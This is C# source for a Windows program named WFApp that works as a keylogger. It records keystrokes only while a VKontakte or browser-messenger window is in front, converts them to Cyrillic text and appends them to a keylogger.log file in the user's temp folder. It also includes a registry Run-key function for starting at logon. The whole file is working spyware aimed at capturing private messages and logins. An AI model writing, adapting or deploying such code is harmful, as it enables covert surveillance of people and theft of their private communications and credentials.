using System;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;

namespace WFApp
{
    static class Program
    {
        [STAThread]
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        private static string buf = "";
        private static string path = @"C:\Users\user\AppData\Local\Temp\keylogger.log";

        private static bool IsForegroundWindowInteresting(String s)
        {
            IntPtr _hwnd = GetForegroundWindow();
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(_hwnd, sb, sb.Capacity);
            if (sb.ToString().ToUpperInvariant().Contains(s.ToUpperInvariant())) return true;
            return false;
        }

        private static bool SetAutorunValue(bool autorun)
        {
            string name = "WFApp";
            string ExePath = Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);

                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }

        static void Main(String[] args)
        {

            //SetAutorunValue(false);

            while (true)
            {
                if (IsForegroundWindowInteresting("Мессенджер — Яндекс.Браузер") ||
                IsForegroundWindowInteresting("Добро пожаловать | ВКонтакте") ||
                IsForegroundWindowInteresting("Welcome! | VK") ||
                IsForegroundWindowInteresting("Мессенджер - Mozilla Firefox") ||
                IsForegroundWindowInteresting("Мессенджер - Google Chrome"))
                {
                    Thread.Sleep(100);
                    for (int i = 0; i < 255; i++)
                    {
                        int state = GetAsyncKeyState(i);
                        if (state != 0)
                        {
                            switch(((Keys)i).ToString())
                            {
                                case "Space":
                                    buf += " ";
                                    continue;
                                case "OemQuestion":
                                    buf += ",";
                                    continue;
                                case "OemMinus":
                                    buf += "-";
                                    continue;
                                case "OemOpenBrackets":
                                    buf += "х";
                                    continue;
                                case "Oem6":
                                    buf += "ъ";
                                    continue;
                                case "Oem1":
                                    buf += "ж";
                                    continue;
                                case "Oem7":
                                    buf += "э";
                                    continue;
                                case "Oemcomma":
                                    buf += "б";
                                    continue;
                                case "OemPeriod":
                                    buf += "ю";
                                    continue;
                                case "D0":
                                    buf += "0";
                                    continue;
                                case "D1":
                                    buf += "1";
                                    continue;
                                case "D2":
                                    buf += "2";
                                    continue;
                                case "D3":
                                    buf += "3";
                                    continue;
                                case "D4":
                                    buf += "4";
                                    continue;
                                case "D5":
                                    buf += "5";
                                    continue;
                                case "D6":
                                    buf += "6";
                                    continue;
                                case "D7":
                                    buf += "7";
                                    continue;
                                case "D8":
                                    buf += "8";
                                    continue; 
                                case "D9":
                                    buf += "9";
                                    continue;
                                case "LShiftKey":
                                    continue;
                                case "ShiftKey":
                                    continue;
                                case "LMenu":
                                    continue;
                                case "Menu":
                                    continue;
                                case "LControlKey":
                                    continue;
                                case "ControlKey":
                                    continue;
                                case "Capital":
                                    continue;
                                case "LButton":
                                    continue; 
                                case "RButton":
                                    continue;
                                case "MButton":
                                    continue;
                            }

                            try
                            {
                                if (((Keys)i) == Keys.Back) { buf = buf.Substring(0, buf.Length - 1); continue; }
                            }
                            catch (Exception exception)
                            {
                                Console.WriteLine($"Exception is {exception}");
                            }
                            bool shift = false;
                            short shiftState = (short)GetAsyncKeyState(16);
                            if ((shiftState & 0x8000) == 0x8000)
                            {
                                shift = true;
                            }
                            bool caps = Console.CapsLock;
                            bool isBig = shift | caps;

                            if (((Keys)i).ToString().Length == 1)
                            {
                                if (isBig)
                                {
                                    buf += ((Keys)i).ToString();
                                }
                                else
                                {
                                    buf += ((Keys)i).ToString().ToLowerInvariant();
                                }
                            }
                            else
                            {
                                buf += $"<{((Keys)i).ToString()}>";
                            }
                            if ((Keys)(i) == Keys.Enter)
                            {
                                buf += "\r\n";
                                File.AppendAllText(path, buf);
                                FileInfo LogFile = new FileInfo(path);
                                buf = "";
                            }
                        }
                    }
                }
            }
        }
    }
}